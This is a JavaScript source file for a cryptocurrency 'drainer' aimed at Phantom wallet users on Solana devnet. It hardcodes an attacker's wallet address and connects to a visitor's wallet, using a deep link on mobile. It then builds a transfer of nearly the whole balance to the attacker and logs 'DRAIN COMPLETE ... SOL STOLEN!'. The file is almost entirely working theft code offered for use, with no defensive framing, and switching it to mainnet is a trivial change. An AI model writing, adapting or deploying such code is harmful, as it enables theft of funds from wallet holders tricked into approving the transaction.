// DEVNET DRAINER - WORKING MOBILE VERSION
// ============================================
// CHANGE THIS TO YOUR WALLET ADDRESS
const MY_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// ============================================

let connection = null;
let logs = [];

function addLog(msg, color = '#0f0') {
    const timestamp = new Date().toLocaleTimeString();
    logs.unshift({ msg, timestamp });
    if (logs.length > 30) logs.pop();
    
    const logDiv = document.getElementById('log');
    if (logDiv) {
        logDiv.innerHTML = logs.map(l => 
            `<div style="color: #0f0; padding: 4px 0; border-bottom: 1px solid #333; font-family: monospace; font-size: 11px;">[${l.timestamp}] ${l.msg}</div>`
        ).join('');
    }
    console.log(msg);
}

async function init() {
    addLog('🔥 DRAINER READY', '#0f0');
    addLog(`🎯 Target: ${MY_WALLET.substring(0, 20)}...`, '#0f0');
    
    // Setup connection
    connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
    addLog('✅ Devnet connected', '#0f0');
    
    // Check if on mobile
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (isMobile) {
        addLog('📱 Mobile device detected', '#ff0');
        addLog('💡 Phantom app will open automatically', '#ff0');
    } else {
        addLog('💻 Desktop mode - Phantom extension required', '#ff0');
    }
}

async function drain() {
    addLog('🦊 Connecting to Phantom...', '#ff0');
    
    try {
        // Mobile: Open Phantom app via deep link
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        
        if (isMobile) {
            // Store pending drain info
            localStorage.setItem('pendingDrain', 'true');
            localStorage.setItem('pendingAmount', '0');
            
            // Deep link to open Phantom app
            const currentUrl = window.location.href;
            const encodedUrl = encodeURIComponent(currentUrl);
            const deepLink = `phantom://browse?url=${encodedUrl}`;
            
            addLog('📱 Opening Phantom app...', '#ff0');
            window.location.href = deepLink;
            
            // Fallback
            setTimeout(() => {
                if (!window.phantom && !window.solana) {
                    addLog('⚠️ Phantom not installed. Get it from phantom.app', '#f00');
                }
            }, 2000);
            return;
        }
        
        // Desktop: Connect directly
        const provider = window.phantom?.solana || window.solana;
        
        if (!provider) {
            addLog('❌ Phantom not found. Please install Phantom extension', '#f00');
            return;
        }
        
        const resp = await provider.connect();
        const victim = resp.publicKey.toString();
        addLog(`✅ Connected: ${victim.substring(0, 24)}...`, '#0f0');
        
        await executeDrain(provider, victim);
        
    } catch (err) {
        addLog(`❌ Error: ${err.message}`, '#f00');
    }
}

async function executeDrain(provider, victimAddress) {
    try {
        // Get balance
        const victimPubkey = new solanaWeb3.PublicKey(victimAddress);
        const balance = await connection.getBalance(victimPubkey);
        const balanceSol = balance / 1e9;
        
        addLog(`💰 Balance: ${balanceSol.toFixed(6)} SOL`, '#0f0');
        
        if (balanceSol < 0.01) {
            addLog(`❌ No SOL to drain (need at least 0.01 SOL)`, '#f00');
            return;
        }
        
        // Calculate amount to drain (leave 0.001 for fees)
        const amountToDrain = balanceSol - 0.001;
        
        addLog(`💀 Draining ${amountToDrain.toFixed(6)} SOL...`, '#f00');
        addLog(`📍 To: ${MY_WALLET.substring(0, 24)}...`, '#ff0');
        
        // Create transaction
        const toPubkey = new solanaWeb3.PublicKey(MY_WALLET);
        const fromPubkey = new solanaWeb3.PublicKey(victimAddress);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToDrain * 1e9
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addLog(`⏳ Waiting for approval...`, '#ff0');
        
        // Send transaction
        const signature = await provider.signAndSendTransaction(transaction);
        
        addLog(`✅ TRANSACTION SENT!`, '#0f0');
        addLog(`🔑 ${signature.substring(0, 48)}...`, '#0f0');
        
        // Confirm
        addLog(`⏳ Confirming on blockchain...`, '#ff0');
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error('Transaction failed on chain');
        }
        
        addLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(6)} SOL STOLEN!`, '#f00');
        addLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, '#0f0');
        
        // Disable button
        const btn = document.getElementById('drainBtn');
        if (btn) {
            btn.disabled = true;
            btn.textContent = '✅ DRAINED!';
            btn.style.opacity = '0.5';
        }
        
    } catch (err) {
        addLog(`❌ Drain failed: ${err.message}`, '#f00');
        throw err;
    }
}

// Check if returning from Phantom mobile app
function checkReturnFromApp() {
    const pending = localStorage.getItem('pendingDrain');
    
    if (pending === 'true') {
        localStorage.removeItem('pendingDrain');
        addLog('🔄 Returned from Phantom app!', '#ff0');
        addLog('🦊 Reconnecting...', '#ff0');
        
        // Wait for Phantom to be available
        setTimeout(async () => {
            try {
                const provider = window.phantom?.solana || window.solana;
                
                if (!provider) {
                    addLog('❌ Phantom not detected. Please ensure Phantom is installed.', '#f00');
                    return;
                }
                
                if (!provider.publicKey) {
                    addLog('🔄 Requesting connection...', '#ff0');
                    const resp = await provider.connect();
                    const victim = resp.publicKey.toString();
                    addLog(`✅ Connected: ${victim.substring(0, 24)}...`, '#0f0');
                    await executeDrain(provider, victim);
                } else {
                    const victim = provider.publicKey.toString();
                    addLog(`✅ Already connected: ${victim.substring(0, 24)}...`, '#0f0');
                    await executeDrain(provider, victim);
                }
                
            } catch (err) {
                addLog(`❌ Error: ${err.message}`, '#f00');
            }
        }, 1500);
    }
}

// Set up event listeners
document.addEventListener('DOMContentLoaded', () => {
    init();
    
    const btn = document.getElementById('drainBtn');
    if (btn) {
        btn.addEventListener('click', drain);
    }
    
    checkReturnFromApp();
});